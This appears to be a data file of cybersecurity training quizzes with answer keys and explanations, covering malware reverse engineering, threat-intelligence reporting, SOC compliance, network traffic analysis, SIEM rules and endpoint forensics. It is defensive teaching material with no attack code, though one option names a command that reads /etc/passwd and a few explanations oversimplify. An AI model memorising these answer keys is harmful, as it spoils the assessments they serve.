      { id: "ma-q5-4", question: "What technique should you use aggressively while analyzing code in Ghidra?", options: ["Running the sample in the Ghidra scripting console to observe dynamic runtime behavior in context", "Renaming functions and variables as you understand them to make the decompiled code progressively readable", "Deleting unneeded or dead code sections to reduce complexity in the Ghidra listing view display", "Patching binary instructions in-place to redirect execution flow toward the malware's decryption stub"], correctAnswer: 1, explanation: "Renaming functions (FUN_00401000 → decrypt_config) and variables as you understand them makes the decompiled code progressively more readable." },
      { id: "ma-q5-5", question: "In x64dbg, what does F7 do?", options: ["Step Over — executes the current instruction but skips into function calls without tracing inside", "Step Into — follows execution into called functions, allowing you to trace through nested code paths", "Run to Cursor — executes all instructions up to the cursor position and then pauses there", "Toggle Breakpoint — sets or removes a software breakpoint at the currently selected instruction"], correctAnswer: 1, explanation: "F7 steps into function calls, following execution into the called function. F8 steps over, treating the call as a single instruction." },
      { id: "ma-q5-6", question: "Why are hardware breakpoints preferred when debugging packed malware?", options: ["Hardware breakpoints execute faster because they bypass the software INT3 interrupt dispatch overhead", "They use CPU debug registers, surviving self-modifying code and remaining invisible to anti-debug checks", "They can intercept and log outbound network packets to identify the malware's C2 communication flow", "Hardware breakpoints are supported exclusively on Linux systems and require kernel debug mode enabled"], correctAnswer: 1, explanation: "Hardware breakpoints use CPU debug registers, so they survive code modification and aren't detectable by common anti-debugging techniques." },
      { id: "ma-q5-7", question: "What x64dbg plugin defeats most anti-debugging techniques automatically?", options: ["OllyDump — a process dumper plugin used to extract and dump packed executables from memory", "ScyllaHide — patches PEB flags and NTDLL hooks to defeat IsDebuggerPresent and timing anti-debug checks", "IDA Sync — a plugin synchronizing IDA Pro analysis databases with running x64dbg debug sessions", "x64dbg Automation — a scripting engine allowing basic automated stepping through code sequences"], correctAnswer: 1, explanation: "ScyllaHide patches PEB flags, timing functions, and NTDLL hooks to automatically defeat IsDebuggerPresent, NtQueryInformationProcess, and timing checks." },
      { id: "ma-q5-8", question: "What is the most common encryption method used by malware for C2 communication?", options: ["AES-256 — a symmetric block cipher used in sophisticated ransomware for file and config encryption", "RSA-2048 — an asymmetric cipher used to protect session keys in hybrid ransomware encryption schemes", "XOR — the most common malware encryption due to its extreme simplicity and easy implementation", "Blowfish — a symmetric block cipher occasionally used by older malware families for config encryption"], correctAnswer: 2, explanation: "XOR encryption is the most common in malware due to simplicity — it's trivially reversible but effective enough against basic detection." },
      { id: "ma-q5-9", question: "What is a Domain Generation Algorithm (DGA)?", options: ["A domain registrar algorithm for automatically purchasing and renewing legitimate domain names", "Malware code generating pseudo-random C2 domain names using date-based seeds for resilient communication", "A DNSSEC security protocol cryptographically signing DNS zone records to prevent spoofing attacks", "A technique encrypting outbound DNS query strings to prevent network monitoring from detecting C2 traffic"], correctAnswer: 1, explanation: "DGAs generate pseudo-random domain names using seeds like dates, allowing malware to find C2 servers even if known domains are taken down." },
      { id: "ma-q5-10", question: "When malware calls LoadLibraryA + GetProcAddress repeatedly, what is it doing?", options: ["Loading encrypted configuration files from disk resources and decrypting them into working memory buffers", "Dynamically resolving API functions at runtime to hide true capabilities from the static import table", "Performing anti-debugging checks by inspecting PEB flags and querying NtQueryInformationProcess results", "Installing Windows device drivers by dynamically loading kernel module DLLs through the service manager"], correctAnswer: 1, explanation: "Dynamic API resolution loads DLLs and resolves function addresses at runtime, hiding the malware's true capabilities from the import table." }
    ]
  },
  {
    quizId: "ma-q6",
    courseId: "malware-analysis",
    title: "Reporting & Threat Intelligence",
    description: "Assess your malware reporting, IOC extraction, and attribution skills.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "ma-q6-1", question: "Which IOC type is considered 'atomic' (easily searchable)?", options: ["Behavioral patterns describing adversary actions and techniques that are difficult to search directly", "File hashes and IP addresses — simple, atomic values directly queryable in SIEM and threat intel tools", "MITRE ATT&CK technique identifiers mapping observed behaviors to the standardized adversary framework", "Attack timeline reconstructions showing the chronological sequence of adversary actions during incidents"], correctAnswer: 1, explanation: "Atomic indicators like file hashes, IPs, and domains are simple, searchable values that can be directly queried in security tools." },
      { id: "ma-q6-2", question: "What format is the industry standard for machine-readable threat intelligence?", options: ["CSV — a simple flat-file format suitable for basic IOC lists but lacking structured relationship support", "STIX 2.1 — the standard JSON-based format for expressing and sharing structured cyber threat intelligence", "XML — a verbose structured markup language used in older threat intel formats like OpenIOC and IODEF", "YAML — a human-readable data format used in SIGMA rules but not the standard for threat intelligence"], correctAnswer: 1, explanation: "STIX (Structured Threat Information Expression) 2.1 is the standard JSON-based format for expressing and sharing cyber threat intelligence." },
      { id: "ma-q6-3", question: "What protocol enables automated IOC sharing between organizations?", options: ["SMTP — the email transfer protocol used for sending notifications but not structured IOC sharing", "TAXII — the transport protocol for automated machine-to-machine STIX threat intelligence exchange", "SNMP — a network management protocol for monitoring device health and configuration status remotely", "LDAP — a directory access protocol for authenticating users and querying Active Directory resources"], correctAnswer: 1, explanation: "TAXII (Trusted Automated Exchange of Intelligence Information) is the transport protocol for sharing STIX-formatted threat intelligence." },
      { id: "ma-q6-4", question: "In a YARA rule, what does 'uint16(0) == 0x5A4D' check?", options: ["Validates the total byte size of the file to filter out files that are too large or too small to match", "Confirms the file is a Windows PE executable by verifying the MZ magic bytes at file offset zero", "Checks if the string encoding used in the file is UTF-16LE by examining the BOM at offset zero", "Counts the number of PE sections in the file to detect abnormally high or low section count values"], correctAnswer: 1, explanation: "This condition checks that the first two bytes are 0x4D5A (MZ in little-endian), confirming the file is a PE executable." },
      { id: "ma-q6-5", question: "What should a malware analysis report's executive summary focus on?", options: ["Detailed assembly-level code analysis showing disassembled function logic and register state changes", "A non-technical risk assessment covering what the malware does, the risk level, and recommended actions", "A complete listing of all extracted IOCs including hashes, IPs, domains, mutexes, and registry keys", "Tool configuration details and analysis environment specifications for report reproducibility verification"], correctAnswer: 1, explanation: "Executive summaries are for non-technical leadership and should focus on what the malware does, the risk level, and recommended actions." },
      { id: "ma-q6-6", question: "Which framework maps malware behaviors to standardized tactics and techniques?", options: ["NIST CSF — a risk management framework defining Identify, Protect, Detect, Respond, and Recover functions", "MITRE ATT&CK — maps adversary behaviors to standardized tactics and techniques for reporting and defense", "ISO 27001 — an international standard defining requirements for information security management systems", "OWASP — a web application security framework focused on web vulnerabilities rather than adversary TTPs"], correctAnswer: 1, explanation: "MITRE ATT&CK maps observed adversary behaviors to standardized tactics, techniques, and procedures, providing a shared language for threat reporting." },
      { id: "ma-q6-7", question: "What YARA string modifier matches both ASCII and UTF-16LE encodings?", options: ["nocase — makes the string match case-insensitively but only applies to ASCII-encoded characters", "fullword — ensures the string is preceded and followed by non-alphanumeric boundary characters", "ascii wide — matches the string in both ASCII and UTF-16LE encoding formats used on Windows systems", "base64 — decodes and matches strings that have been Base64-encoded inside the target binary file"], correctAnswer: 2, explanation: "Using both 'ascii' and 'wide' modifiers on a string ensures it matches whether encoded as ASCII or UTF-16LE (common in Windows)." },
      { id: "ma-q6-8", question: "For attribution, what confidence level requires multiple independent technical overlaps?", options: ["Low — based on a single shared indicator like an IP address with no additional corroborating evidence", "Medium — requires multiple independent overlaps like code similarity AND infrastructure reuse together", "High — the attribution confidence level also requiring operational consistency and historical precedent", "Confirmed — the highest confidence requiring physical or legal evidence of the identified threat actor"], correctAnswer: 1, explanation: "Medium confidence requires multiple technical overlaps such as code similarity AND infrastructure reuse. High adds operational and historical consistency." },
      { id: "ma-q6-9", question: "What tool compares two binaries for shared functions at the code level?", options: ["ssdeep — a fuzzy hashing tool that compares overall file similarity based on byte-level content blocks", "BinDiff — compares binary executables at the function level to identify shared code between samples", "YARA — a pattern-matching tool used to classify malware families based on string and byte signatures", "CyberChef — a web-based data transformation tool for encoding, decoding, and formatting data values"], correctAnswer: 1, explanation: "BinDiff compares binary executables at the function level, identifying shared code between samples to link them to the same author or family." },
      { id: "ma-q6-10", question: "What does passive DNS data reveal about threat actor infrastructure?", options: ["Reconstructed malware source code recovered from decompiled binary executables and debug artifacts", "Historical domain-to-IP mappings exposing infrastructure reuse patterns across different threat campaigns", "Symmetric encryption keys recovered from captured network traffic using known-plaintext attack methods", "Victim organization identities derived from DNS lookup patterns and query volume correlation analysis"], correctAnswer: 1, explanation: "Passive DNS records historical domain resolutions, revealing when domains pointed to which IPs and identifying infrastructure overlap between campaigns." }
    ]
  },
  // SOC ANALYST LEARNING PATH QUIZZES
  {
    quizId: "sap-q1",
    courseId: "soc-analyst-path",
    title: "SOC Analyst Foundations Quiz",
    description: "Test your understanding of the SOC analyst role, maturity models, and compliance.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      { id: "sap-q1-1", question: "What is the primary purpose of a SOC maturity model?", options: ["To rank security analysts based on their ticket closing speed and determine annual salary adjustments.", "To assess and systematically mature SOC capabilities across people, processes, technology, and governance.", "To evaluate and select the most cost-effective SIEM vendor during the procurement phase.", "To automatically generate regulatory compliance certificates required for external audits."], correctAnswer: 1, explanation: "SOC maturity models assess capabilities across People, Process, Technology, Services, and Governance." },
      { id: "sap-q1-2", question: "GDPR requires breach notification within how many hours?", options: ["A personal data breach must be reported to the supervisory authority within 24 hours of discovery.", "A personal data breach must be reported to the supervisory authority within 48 hours of discovery.", "A personal data breach must be reported to the supervisory authority within 72 hours of discovery.", "A personal data breach must be reported to the supervisory authority within 96 hours of discovery."], correctAnswer: 2, explanation: "GDPR mandates 72-hour breach notification to supervisory authority." },
      { id: "sap-q1-3", question: "What is the minimum log retention under PCI-DSS?", options: ["A minimum of 6 months, with all network and system logs immediately searchable in the hot storage tier.", "A minimum of 1 year, with at least 3 months of logs immediately available for active query and analysis.", "A minimum of 3 years, with all historical audit records archived on offline read-only backup media.", "A minimum of 7 years, to comply with federal tax and financial record retention regulations."], correctAnswer: 1, explanation: "PCI-DSS requires 1 year retention with 3 months immediately available." },
      { id: "sap-q1-4", question: "Which NIST CSF functions are the SOC's primary focus?", options: ["Identify and Protect, focusing on asset inventories, vulnerability scans, and system hardening rules.", "Detect and Respond, focusing on active security monitoring, threat detection, and incident containment.", "Recover and Govern, focusing on server restoration backups and organizational policy alignment.", "Protect and Recover, focusing on firewall rules, multi-factor authentication, and disaster recovery."], correctAnswer: 1, explanation: "Detect and Respond are the primary SOC functions in NIST CSF." },
      { id: "sap-q1-5", question: "How many alerts should a typical L1 analyst triage per shift?", options: ["Between 5 and 10 high-priority alerts, allowing for deep forensic host and memory analysis per ticket.", "Between 10 and 20 alerts, representing a highly tuned or small-scale security environment.", "Between 30 and 60 alerts, balancing initial triage depth with overall queue coverage efficiency.", "Between 100 and 200 alerts, requiring rapid closing of alerts without performing any investigation."], correctAnswer: 2, explanation: "A typical L1 analyst targets 30-60 alerts per shift." },
      { id: "sap-q1-6", question: "What percentage of alerts should typically be escalated?", options: ["Between 1% and 3%, representing a highly optimized SIEM with virtually zero false positive alerts.", "Between 5% and 15%, representing the standard escalation rate of validated alerts from L1 to L2.", "Between 25% and 35%, indicating that L1 analysts require significant training in basic triage.", "Between 50% and 60%, showing that the initial correlation rules generate too many true positives."], correctAnswer: 1, explanation: "Typically 5-15% of alerts are escalated from L1 to L2." },
      { id: "sap-q1-7", question: "What compliance framework addresses healthcare data?", options: ["PCI-DSS, which is the mandatory global security standard for protecting payment cardholder databases.", "SOX (Sarbanes-Oxley), regulating financial reporting integrity and disclosures for public companies.", "HIPAA, which mandates the protection and privacy of Protected Health Information (PHI/ePHI).", "GDPR, which protects the general personal data and privacy of all European Union citizens."], correctAnswer: 2, explanation: "HIPAA addresses protection of healthcare data (ePHI)." },
      { id: "sap-q1-8", question: "SOX compliance applies to which organizations?", options: ["Healthcare providers and medical facilities processing patient health and billing records.", "Publicly traded companies, ensuring the integrity of financial reporting and internal control systems.", "Educational institutions and universities receiving federal funding or research grants.", "Non-profit organizations and registered charities operating international relief programs."], correctAnswer: 1, explanation: "SOX applies to publicly traded companies." },
      { id: "sap-q1-9", question: "What is the relationship between compliance and security?", options: ["They are completely identical concepts, and achieving compliance guarantees absolute network security.", "Compliance represents the security ceiling, defining the maximum possible defensive maturity level.", "Compliance is the baseline floor, while true security goes beyond checklists to mitigate actual threats.", "Security is entirely unnecessary if an organization is fully compliant with external audit standards."], correctAnswer: 2, explanation: "Compliance is the minimum — true security goes beyond regulatory requirements." },
      { id: "sap-q1-10", question: "What should you do with an investigation VM after analyzing malware?", options: ["Keep using the active VM for subsequent malware analysis to save setup and system boot time.", "Revert the VM to a clean, isolated snapshot to prevent cross-contamination of samples.", "Share the active VM state file with colleagues to let them review memory artifacts locally.", "Connect the virtual machine to the production network to update antivirus signature databases."], correctAnswer: 1, explanation: "Always revert to clean snapshot after malware analysis." },
      { id: "sap-q1-11", question: "What is the first step in alert triage?", options: ["Immediately block the source IP address at the perimeter firewall interface to stop traffic.", "Escalate the ticket to Tier 2 and notify senior management of a validated security breach.", "Review alert details, metadata, and associated logs to assess the scope and context of the event.", "Run a full forensic disk image and memory capture of the affected workstation to preserve evidence."], correctAnswer: 2, explanation: "First review alert details and initial assessment before any action." },
      { id: "sap-q1-12", question: "What is the purpose of shift handover?", options: ["To evaluate the performance metrics and ticket resolution speeds of individual incoming analysts.", "To ensure operational continuity by communicating ongoing incidents, active alerts, and pending tasks.", "To submit a formal daily report directly to the Chief Information Security Officer for review.", "To assign blame for any unresolved alerts remaining in the queue from the outgoing shift."], correctAnswer: 1, explanation: "Handovers ensure smooth transitions and prevent dropped incidents." },
      { id: "sap-q1-13", question: "Which tool is essential for a SOC analyst's toolkit?", options: ["Photoshop, used to generate visual network diagrams and flowcharts for auditing committees.", "VirusTotal, used to analyze file hashes, domain names, IP addresses, and malicious URLs.", "Microsoft Word, used to draft security policies and long-term compliance procedures.", "Social media monitoring dashboards to check general industry news and technology trends."], correctAnswer: 1, explanation: "VirusTotal is essential for analyzing hashes, URLs, IPs, and domains." },
      { id: "sap-q1-14", question: "How many SOC-CMM maturity levels exist?", options: ["The SOC-CMM model defines 3 maturity levels: Initial, Managed, and Defined capabilities.", "The SOC-CMM model defines 4 maturity levels: Initial, Repeatable, Defined, and Managed capabilities.", "The SOC-CMM model defines 5 maturity levels: Initial, Repeatable, Defined, Managed, and Optimizing.", "The SOC-CMM model defines 6 maturity levels: from Level 0 (Incomplete) to Level 5 (Optimizing)."], correctAnswer: 3, explanation: "SOC-CMM has 6 levels (0-5): Incomplete through Optimizing." },
      { id: "sap-q1-15", question: "What does PCI-DSS Requirement 10 mandate?", options: ["Conducting quarterly external penetration tests of all internet-facing systems and host subnets.", "Tracking and monitoring all access to network resources and cardholder data system components.", "Performing background checks on all employees who have administrative system access privileges.", "Installing physical access locks and biometric scanners at all data center entry doors."], correctAnswer: 1, explanation: "Req 10 mandates tracking and monitoring all access to network resources and cardholder data." }
    ]
  },
  {
    quizId: "sap-q2",
    courseId: "soc-analyst-path",
    title: "Network Traffic Analysis Quiz",
    description: "Evaluate your TCP/IP analysis, DNS threats, and packet inspection skills.",
    passingScore: 75,
    timeLimit: 20,
    questions: [
      { id: "sap-q2-1", question: "What indicates a SYN scan?", options: ["A SYN packet followed by an ACK response, then immediate FIN closure from client.", "A SYN packet followed by a SYN-ACK response, then client sends RST without final ACK.", "FIN, PSH, and URG flags set simultaneously in a single incoming packet header.", "An ACK packet sent directly to a closed port, generating a destination unreachable log."], correctAnswer: 1, explanation: "SYN scan sends SYN, receives SYN-ACK, sends RST without completing handshake." },
      { id: "sap-q2-2", question: "What indicates C2 beaconing?", options: ["Random outbound connections to a large volume of different external IP addresses.", "Outbound connections at regular intervals with consistent data sizes to the same IP.", "A high volume of concurrent downloads from major content delivery network (CDN) hosts.", "Standard recurring DNS resolution requests directed to public Google DNS servers."], correctAnswer: 1, explanation: "C2 beaconing shows regular timing with consistent packet sizes to the same destination." },
      { id: "sap-q2-3", question: "Windows systems typically use what TTL value?", options: ["A standard default TTL value of 32, indicating a short local network lifespan.", "A standard default TTL value of 64, which is typical for Linux and macOS systems.", "A standard default TTL value of 128, which is the default for Windows OS networking.", "A standard default TTL value of 255, commonly used by network routers and switches."], correctAnswer: 2, explanation: "Windows uses TTL=128, Linux uses TTL=64." },
      { id: "sap-q2-4", question: "What is DNS tunneling?", options: ["Encrypting local DNS traffic using DNS over HTTPS (DoH) to bypass proxy logging.", "Encoding data in DNS query subdomain labels to bypass firewall monitoring.", "Blocking malicious domain resolutions at the local recursive DNS server level.", "Establishing a secure VPN tunnel using DNS port 53 for standard web browsing."], correctAnswer: 1, explanation: "DNS tunneling encodes data in subdomain labels to communicate covertly." },
      { id: "sap-q2-5", question: "What indicates DGA malware?", options: ["Normal browsing traffic showing sequential requests to standard websites.", "A high volume of NXDomain responses from a single host resolving random domains.", "Misconfigured local DNS server IPs generating timeout logs in the event viewer.", "High network bandwidth usage caused by large file downloads over port 80 or 443."], correctAnswer: 1, explanation: "DGA generates many domains, most of which don't resolve (NXDomain)." },
      { id: "sap-q2-6", question: "What does fast-flux DNS involve?", options: ["Rapid rotation of IP addresses for a single domain name using very low TTL values.", "Slow DNS resolution times caused by network congestion and packet loss.", "Assigning static IP addresses to a domain to ensure high availability.", "Caching DNS resolutions locally on client systems to optimize performance."], correctAnswer: 0, explanation: "Fast-flux rapidly rotates IPs (every 30-60s) using very low TTL." },
      { id: "sap-q2-7", question: "Which User-Agent is suspicious?", options: ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0", "Python-urllib/3.8, indicating automated scripts rather than interactive user browsing.", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15", "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0."], correctAnswer: 1, explanation: "Python-urllib indicates automated scripting, unusual for normal browsing." },
      { id: "sap-q2-8", question: "Wireshark filter for HTTP POST requests?", options: ["http.post — which is a simplified but invalid filter string in modern Wireshark.", "http.request.method == \"POST\" — which specifically filters for HTTP POST operations.", "tcp.method == POST — which attempts to filter TCP flags rather than HTTP protocol fields.", "filter.http.post — an incorrect syntax that fails to parse in the filter engine."], correctAnswer: 1, explanation: "The correct filter is http.request.method == \"POST\"." },
      { id: "sap-q2-9", question: "What is JA3 fingerprinting used for?", options: ["Identifying the specific file formats of downloaded email attachments.", "Creating unique hashes of TLS client hello parameters to identify client software.", "Cracking local user passwords by auditing password hashes in the database.", "Analyzing the structure of DNS queries to detect domain generation algorithms."], correctAnswer: 1, explanation: "JA3 fingerprints TLS client hellos to identify specific malware families." },
      { id: "sap-q2-10", question: "Which port is used for SMB lateral movement?", options: ["Port 22, which is the standard port for Secure Shell (SSH) remote command line.", "Port 80, used for unencrypted HTTP web traffic and proxy configurations.", "Port 443, used for encrypted HTTPS communication and TLS connections.", "Port 445, used for Server Message Block (SMB) file sharing and lateral movement."], correctAnswer: 3, explanation: "Port 445 (SMB) is commonly used for lateral movement and ransomware." },
      { id: "sap-q2-11", question: "What DNS indicator suggests tunneling?", options: ["Short, standard queries directed to internal Active Directory DNS servers.", "Unusually long subdomain labels containing random, high-entropy characters.", "Standard A record queries returning single public IP address resolutions.", "DNS requests occurring exclusively during standard corporate business hours."], correctAnswer: 1, explanation: "DNS tunneling creates long, high-entropy subdomain labels." },
      { id: "sap-q2-12", question: "How to follow a TCP conversation in Wireshark?", options: ["Navigating to Edit > Preferences and enabling the TCP conversation option.", "Right-clicking a packet and selecting Follow > TCP Stream from the context menu.", "Opening the Statistics menu and selecting the general Conversations panel.", "Running the Analyze > Stream command-line tool in the terminal window."], correctAnswer: 1, explanation: "Right-click a packet and Follow → TCP Stream reconstructs the conversation." },
      { id: "sap-q2-13", question: "What does XMAS scan send?", options: ["A single SYN packet designed to prompt a standard connection response.", "An ACK packet alone to check for active firewall filtering policies.", "A packet with the FIN, PSH, and URG flags set, lighting up like a tree.", "A completely empty TCP packet header containing no operational flag settings."], correctAnswer: 2, explanation: "XMAS scan sets FIN, PSH, and URG flags — unusual combination for evasion." },
      { id: "sap-q2-14", question: "Purpose of proxy log analysis in SOC?", options: ["Monitoring general employee productivity and tracking physical desk attendance.", "Detecting web-based threats, unauthorized data exfiltration, and C2 channels.", "Analyzing local network bandwidth speeds and identifying connection delays.", "Managing disk storage space and setting automated log rotation schedules."], correctAnswer: 1, explanation: "Proxy logs detect web threats, data exfiltration, and C2 communication." },
      { id: "sap-q2-15", question: "What is a DGA domain characteristic?", options: ["Long, meaningful words combined in predictable dictionary sequences.", "High entropy domain names consisting of random-looking alphanumeric strings.", "Domains resolving exclusively to static, well-known CDN host IP addresses.", "Domains that utilize standard corporate naming conventions and patterns."], correctAnswer: 1, explanation: "DGA domains have high entropy (random-looking characters) like xkq8r3m2p.com." }
    ]
  },
  {
    quizId: "sap-q3",
    courseId: "soc-analyst-path",
    title: "SIEM Mastery Assessment",
    description: "Test SIEM queries, correlation rules, and dashboard skills.",
    passingScore: 75,
    timeLimit: 25,
    questions: [
      { id: "sap-q3-1", question: "What function counts unique values in SIEM?", options: ["The count() function, which returns the total number of matching log events.", "The sum() function, which calculates the arithmetic sum of a specific field.", "The dc() / distinct_count() function, which counts the number of unique field values.", "The avg() function, which calculates the average value of a numeric field."], correctAnswer: 2, explanation: "dc() counts unique values, useful for finding hosts accessed by a single IP." },
      { id: "sap-q3-2", question: "Best approach to designing correlation rules?", options: ["Start with the available log sources and write rules based on what fields are present.", "Start with a specific MITRE ATT&CK technique, understand behavior, then map to log sources.", "Copy default rules from online repositories and import them directly without tuning.", "Focus exclusively on single-event rules to keep the SIEM processing resource usage low."], correctAnswer: 1, explanation: "Threat-informed design starts with the attack technique, then maps to data sources." },
      { id: "sap-q3-3", question: "Why is multi-event correlation better?", options: ["It generates a higher volume of alerts to ensure the security queue is never empty.", "It reduces false positives by requiring multiple related conditions to be met.", "It is significantly easier to write and maintain than simple single-event rules.", "It uses far fewer SIEM database resources and speeds up search performance."], correctAnswer: 1, explanation: "Multiple conditions produce higher confidence alerts." },
      { id: "sap-q3-4", question: "Process chain indicating macro attack?", options: ["explorer.exe spawning chrome.exe, representing standard user-initiated web browsing.", "winword.exe spawning cmd.exe or powershell.exe, indicating malicious document execution.", "svchost.exe spawning services.exe, which is the normal system service host start sequence.", "lsass.exe spawning csrss.exe, indicating standard Windows credential storage operations."], correctAnswer: 1, explanation: "Office apps spawning CLI tools indicates macro execution." },
      { id: "sap-q3-5", question: "Max panels for a SOC dashboard?", options: ["2 to 4 panels, which is too sparse and fails to show critical operational metrics.", "8 to 10 panels, providing sufficient key metrics without causing cognitive overload.", "20 to 30 panels, which tracks every minor event but causes extreme alert fatigue.", "As many as possible to fill the screen space and showcase complex visualization widgets."], correctAnswer: 1, explanation: "Limit to 8-10 panels to prevent information overload." },
      { id: "sap-q3-6", question: "First step in log source onboarding?", options: ["Writing correlation rules and alerts for the new device before logs start arriving.", "Installing the log forwarder agent on all endpoints and servers in production.", "Identifying the log source, understanding its event format, and assessing log volume.", "Creating complex visualization dashboards to showcase the new data to stakeholders."], correctAnswer: 2, explanation: "First identify the device, events, format, and expected volume." },
      { id: "sap-q3-7", question: "What is field normalization?", options: ["Deleting unused fields from log entries to save storage space in the SIEM index.", "Mapping diverse vendor-specific fields to a common naming schema like CIM or ECS.", "Encrypting sensitive field values like usernames and IP addresses in the database.", "Reducing the total number of logs by filtering out events that don't match rules."], correctAnswer: 1, explanation: "Normalization maps source-specific fields to unified schema for cross-source correlation." },
      { id: "sap-q3-8", question: "How to handle high FP rate on a rule?", options: ["Deleting the rule immediately from the active queue to keep false positive counts low.", "Instructing analysts to ignore the alerts or auto-close them without investigation.", "Adding whitelists for authorized activity, adjusting thresholds, and adding context.", "Filing a support ticket to blame the SIEM vendor for poor default detection quality."], correctAnswer: 2, explanation: "Tune with whitelists, adjusted thresholds, and context conditions." },
      { id: "sap-q3-9", question: "What makes a dashboard 'actionable'?", options: ["Using highly colorful charts and advanced 3D visual formats to attract attention.", "Including drill-down links that let analysts click panels to run detailed searches.", "Displaying a large number of data points and raw events directly on a single page.", "Implementing complex visualizations that require specialized training to interpret."], correctAnswer: 1, explanation: "Actionable dashboards allow clicking any panel to drill into underlying data." },
      { id: "sap-q3-10", question: "SIEM query detecting RDP lateral movement?", options: ["Counting distinct target systems per source IP for RDP connections (logon type 10).", "Counting the total number of successful logins across all domain controllers.", "Searching for failed password attempts on public-facing remote desktop portals.", "Filtering network connection logs by unrecognized browser user agent strings."], correctAnswer: 0, explanation: "Count distinct target hosts per source IP for RDP (logon type 10)." },
      { id: "sap-q3-11", question: "What is a cool-down period?", options: ["The time required for the SIEM database servers to cool down during scheduled maintenance.", "A suppression window that prevents repeated alerts for the same condition within a time frame.", "The scheduled time between security rule updates and signature feed synchronizations.", "The maximum idle timeout period before a SOC analyst is logged out of the console."], correctAnswer: 1, explanation: "Cool-downs suppress repeated alerts for the same condition within a time window." },
      { id: "sap-q3-12", question: "What to validate after log source onboarding?", options: ["Verifying only that events are being received by the collector service without errors.", "Validating correct timestamps, accurate field parsing, searchability, and zero gaps.", "Checking that field names match standard documentation formatting guides.", "Testing that the network connection is active between the source and the SIEM."], correctAnswer: 1, explanation: "Validate timestamps, field parsing, volume, searchability, and absence of gaps." },
      { id: "sap-q3-13", question: "First query optimization technique?", options: ["Using regular expressions (regex) for all search terms to ensure exact matches.", "Applying narrow time windows and specific index or source filters early in the query.", "Removing all filters to scan the entire database for any possible indicators of threat.", "Searching all available indices simultaneously without specifying target directories."], correctAnswer: 1, explanation: "Filter early to reduce data the SIEM needs to process." },
      { id: "sap-q3-14", question: "Ransomware detection rule is based on?", options: ["A sudden spike in outbound network traffic volume to unrecognized external IP addresses.", "A high rate of file renames or modifications containing known ransomware extensions.", "Unusual login patterns on domain controllers during non-business hours.", "An increase in the volume of inbound emails containing zip file attachments."], correctAnswer: 1, explanation: "Detect rapid file renames (>50 in 5 min) with extensions like .encrypted, .locked." },
      { id: "sap-q3-15", question: "What is baseline deviation used for?", options: ["Setting up the initial SIEM configuration and defining the default database schema.", "Detecting anomalous activity by comparing current metrics to established historical norms.", "Automatically deleting old logs that exceed the standard retention policy timeframe.", "Creating new user accounts and assigning roles based on corporate directory groups."], correctAnswer: 1, explanation: "Baseline deviation compares current behavior to historical averages for anomaly detection." }
    ]
  },
  {
    quizId: "sap-q4",
    courseId: "soc-analyst-path",
    title: "Endpoint Investigation Quiz",
    description: "Assess endpoint forensics on Windows and Linux.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      { id: "sap-q4-1", question: "Expected parent of svchost.exe?", options: ["explorer.exe, which manages the graphical user interface and taskbar component.", "winlogon.exe, which handles user logon session creation and security controls.", "services.exe, which is the Service Control Manager responsible for background services.", "csrss.exe, which handles the user-mode console window and thread creation."], correctAnswer: 2, explanation: "svchost.exe should always be a child of services.exe." },
      { id: "sap-q4-2", question: "What are LOLBins?", options: ["Malware categories that specifically target local system backup repositories.", "Legitimate Windows operating system binaries that are abused by threat actors.", "Logging binaries used by SIEM forwarders to collect event log entries.", "Linux commands used to perform administrative tasks and check system states."], correctAnswer: 1, explanation: "LOLBins are legitimate tools (certutil, mshta) abused for malicious purposes." },
      { id: "sap-q4-3", question: "Common persistence registry key?", options: ["HKLM\\HARDWARE, which contains hardware configuration and processor device listings.", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run, which executes programs at logon.", "HKCU\\Console, which stores custom settings for console window rendering.", "HKLM\\SAM, which stores local user account security and password hashes."], correctAnswer: 1, explanation: "Run keys auto-start programs listed there." },
      { id: "sap-q4-4", question: "What is process hollowing?", options: ["Deleting a process entirely from the active process tree to hide its execution.", "Creating a suspended legitimate process and replacing its memory with malicious code.", "Running a specialized executable designed to scan for empty memory regions.", "Monitoring active memory spaces to detect unauthorized thread allocations."], correctAnswer: 1, explanation: "Process hollowing replaces legitimate process memory with malicious code." },
      { id: "sap-q4-5", question: "Linux command for network connections with PIDs?", options: ["ls -la, which lists all directory files with their permissions and owner details.", "ss -tnp, which displays active TCP connections with their associated process PIDs.", "cat /etc/passwd, which displays the list of local user accounts on the system.", "df -h, which displays disk space usage statistics in human-readable format."], correctAnswer: 1, explanation: "ss -tnp shows TCP connections with associated process IDs." },
      { id: "sap-q4-6", question: "Volatility plugin for injected code?", options: ["pslist, which lists active processes by traversing the double-linked active list.", "netscan, which identifies open network connections and active sockets in memory.", "malfind, which scans for injected code and suspicious RWX memory permissions.", "hivelist, which displays registry hives loaded in the physical memory dump."], correctAnswer: 2, explanation: "malfind finds suspicious RWX memory regions and PE headers." },
      { id: "sap-q4-7", question: "Why capture memory before shutdown?", options: ["Because physical memory is non-volatile and can be recovered easily later.", "Because volatile data like network connections and running processes is lost on reboot.", "Because capturing memory is significantly faster than executing a system shutdown.", "To save disk storage space by compressing active system files during retrieval."], correctAnswer: 1, explanation: "Running processes, connections, and decrypted data disappear on shutdown." },
      { id: "sap-q4-8", question: "Linux persistence through user login?", options: ["/var/log/syslog, which records general system alerts and service status events.", "/home/user/.bashrc, which executes custom commands every time a new shell opens.", "/etc/hostname, which stores the local system computer name definition.", "/boot/grub/grub.cfg, which configures the bootloader options and default kernel."], correctAnswer: 1, explanation: ".bashrc executes every bash shell — attackers add malicious commands." },
      { id: "sap-q4-9", question: "PAGE_EXECUTE_READWRITE indicates?", options: ["Normal system behavior representing standard data storage permissions in RAM.", "A strong indicator of potential code injection since memory is both writable and executable.", "A kernel-level protection policy designed to prevent buffer overflow attacks.", "Standard memory corruption indicating hardware failure or device driver bugs."], correctAnswer: 1, explanation: "RWX permissions are unusual and often indicate injected shellcode." },
